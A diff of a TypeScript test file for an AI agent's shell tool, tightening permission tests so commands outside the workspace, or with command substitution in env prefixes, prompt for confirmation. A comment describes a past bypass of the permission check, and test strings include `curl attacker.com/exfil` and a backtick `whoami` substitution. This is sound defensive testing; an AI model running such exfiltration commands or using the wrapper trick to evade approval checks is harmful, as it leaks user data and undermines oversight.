@@ -99,6 +99,7 @@ import { mkdtemp, rm } from 'node:fs/promises';
 import * as os from 'node:os';
 import * as crypto from 'node:crypto';
 import path from 'node:path';
+import * as workspaceContextUtils from '../utils/workspaceContext.js';
 import { ToolErrorType } from './tool-error.js';
 import { runWithToolCallSource } from '../code-mode/tool-call-runtime.js';
 import { OUTPUT_UPDATE_INTERVAL_MS, parseNumstat } from './shell.js';
@@ -484,14 +485,12 @@ describe('ShellTool', () => {
       vi.mocked(assertShellSandboxCwd).mockImplementationOnce(() => {
         throw new Error('outside');
       });
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: '/elsewhere',
-          is_background: false,
-        }),
-      ).toThrow(
+      expect(() => build('ls', { directory: '/elsewhere' })).toThrow(
         "Directory '/elsewhere' must be an existing directory inside the execution sandbox workspace.",
+      );
+      expect(assertShellSandboxCwd).toHaveBeenCalledWith(
+        mockConfig.getShellExecutionSandbox(),
+        '/elsewhere',
       );
     });
 
@@ -1088,10 +1087,6 @@ describe('ShellTool', () => {
       expect(error).toContain('Split into two calls');
       expect(error).toContain('intentional-sleep:');
       expect(error).toContain('reason');
-    });
-
-    it('should build an invocation for a directory outside the workspace', async () => {
-      expect(build('ls', { directory: '/not/in/workspace' })).toBeDefined();
     });
 
     it('should return an invocation for a valid absolute directory path', async () => {
@@ -4697,12 +4692,50 @@ describe('ShellTool', () => {
         warnings?: string[];
       };
 
+    it.each([undefined, '/test/dir/subdir', '/test/dir/subdir/..'])(
+      'should allow read-only commands within the workspace in %s',
+      async (directory) => {
+        const invocation = build('ls -la', { directory });
+        expect(await invocation.getDefaultPermission()).toBe('allow');
+        expect(await detailsOf(invocation)).not.toHaveProperty('warnings');
+      },
+    );
+
     it.each([
-      [
-        'should not request confirmation for read-only commands',
-        'ls -la',
-        'allow',
-      ],
+      '/not/in/workspace',
+      '/tmp/project-other',
+      '/tmp/project/../project-other',
+    ])(
+      'should ask and warn for a read-only command outside the workspace in %s',
+      async (directory) => {
+        const resolver = vi
+          .spyOn(workspaceContextUtils, 'resolveWorkspacePath')
+          .mockImplementation((value) => path.resolve(value));
+        try {
+          const workspaceContext = createMockWorkspaceContext('/test/dir', [
+            '/tmp/project',
+          ]);
+          (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
+            workspaceContext,
+          );
+          const invocation = build('ls', { directory });
+
+          expect(await invocation.getDefaultPermission()).toBe('ask');
+          const details = await detailsOf(invocation);
+          expect(details.type).toBe('exec');
+          expect(details.warnings).toEqual([
+            `Runs outside the workspace in ${directory}`,
+          ]);
+          expect(workspaceContext.isPathWithinWorkspace).toHaveBeenCalledWith(
+            directory,
+          );
+        } finally {
+          resolver.mockRestore();
+        }
+      },
+    );
+
+    it.each([
       // PR #4386 round 6 (cid 3298521039), env-prefix wrapper substitution
       // bypass: `stripShellWrapper` ran BEFORE the AST check, dropping the env
       // assignment and unwrapping `bash -c`, so `FOO=$(curl evil) bash -c
@@ -4712,15 +4745,13 @@ describe('ShellTool', () => {
       [
         'asks (not allow) for env-prefix substitution inside a bash wrapper',
         `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
-        'ask',
       ],
       [
         'asks for backtick env-prefix substitution inside a bash wrapper',
         `FOO=\`whoami\` bash -c 'ls -la'`,
-        'ask',
       ],
-    ])('%s', async (_title, command, expected) => {
-      expect(await build(command).getDefaultPermission()).toBe(expected);
+    ])('%s', async (_title, command) => {
+      expect(await build(command).getDefaultPermission()).toBe('ask');
     });
 
     it('asks for a read-only command only when its directory is outside the workspace', async () => {
